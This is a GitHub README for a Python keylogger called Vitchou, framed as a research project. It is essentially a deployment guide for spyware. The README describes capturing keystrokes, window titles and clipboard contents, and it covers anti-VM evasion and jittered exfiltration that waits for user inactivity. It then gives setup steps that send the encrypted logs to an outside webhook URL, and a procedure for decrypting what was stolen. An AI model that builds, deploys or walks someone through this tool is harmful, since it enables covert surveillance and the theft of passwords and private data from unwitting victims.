# Vitchou : Advanced KeyLogger

```text
 ____   ____.__  __         .__                   
 \   \ /   /|__|/  |_  ____ |  |__   ____  __ __  
  \   Y   / |  \   __\/ ___\|  |  \ /  _ \|  |  \ 
   \     /  |  ||  | \  \___|   Y  \(  <_> )  |  /
    \___/   |__||__|  \___  >___|  / \____/|____/ 
                          \/     \/               

```

> **Cybersecurity Research Project**: A high-performance, asynchronous telemetry agent designed to demonstrate advanced data exfiltration and endpoint monitoring techniques.

---

## 🌟 Overview

**Vitchou KeyLogger** is a resilient Python-based telemetry agent. Unlike standard scripts, it focuses on **operational security (OPSEC)**, data integrity through local persistence, and stealthy network communication.

## 🛠️ Core Technical Features

* **Asynchronous Engine**: Built on `asyncio` for non-blocking key-capture and network operations.
* **Hybrid Crypto Pipeline**:
* **Compression**: `zlib` (Level 9) to minimize data footprints.
* **Encryption**: Full **AES-256 (Fernet)** symmetric encryption for all exfiltrated data.


* **Persistent Buffering**: Integrated **SQLite WAL** (Write-Ahead Logging) database. If the target loses internet access, logs are stored locally and encrypted until a connection is restored.
* **Stealth Tactics**:
* **Idle Detection**: Data exfiltration only triggers after a period of user inactivity (default: 30s).
* **Randomized Jitter**: Uses random delays to break traffic patterns.
* **Anti-VM Protection**: Self-terminates if VirtualBox, VMware, or QEMU is detected.


* **Deep Contextual Logging**: Captures window titles, timestamps, user sessions, and clipboard events.

---

## 🚀 Step-by-Step Installation & Setup

### 1. Environment Setup

Clone the repository and install the required Python libraries:

```bash
git clone https://github.com/Vitchou/Vitchou-Advanced-Keylogger.git
cd Vitchou-Advanced-Keylogger
pip install -r requirements.txt

```

### 2. Generate Your Security Key

This project uses symmetric encryption. Both the Logger and the Decryptor must use the **same key**. Generate one by running this command in your terminal:

```bash
python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"

```

*Copy the output (e.g., `uY2...=`). You will need it in the next steps.*

### 3. Configure the Logger (`VLogger.py`)

Open `VLogger.py` in your editor and locate the `CONFIG` dictionary at the top.

* **MASTER_KEY**: Paste the key you generated in Step 2.
* **REPORT_URL**: Go to [Webhook.site](https://webhook.site), copy your "unique URL", and paste it here.

```python
CONFIG = {
    "MASTER_KEY": "YOUR_GENERATED_KEY_HERE",
    "REPORT_URL": "https://webhook.site/YOUR-UNIQUE-ID",
    "IDLE_THRESHOLD": 30, # Seconds of inactivity before sending data
    "ANTI_VM": True
}

```

### 4. Run the Agent

Start the monitoring process:

```bash
python VLogger.py

```

* **To Trigger a Report**: Type at least 100 characters, then **stop moving your mouse or typing for 30 seconds**. The agent will then encrypt the data and send it to your Webhook.

---

## 🔓 Decryption Guide (`decryptor.py`)

Once you receive a POST request on Webhook.site, the data in **Raw Content** will look like an unreadable string of random characters.

### 1. Configure the Decryptor

Open `decryptor.py` and update these two variables:

* **MASTER_KEY**: Must be the **exact same key** used in `VLogger.py`.
* **ENCRYPTED_PAYLOAD**: Copy the entire block of text from the **Raw Content** section of your Webhook.site request and paste it inside the triple quotes.

```python
# --- CONFIGURATION ---
MASTER_KEY = "YOUR_GENERATED_KEY_HERE"

ENCRYPTED_PAYLOAD = """PASTE_THE_LONG_STRING_FROM_WEBHOOK_HERE"""

```

### 2. Run the Decryption

Execute the script to reveal the captured logs in plain text:

```bash
python decryptor.py

```

---

## ⚠️ Disclaimer

This tool is for **educational and authorized security testing only**. The author is not responsible for any misuse. Unauthorized use of this tool against systems you do not own is illegal.
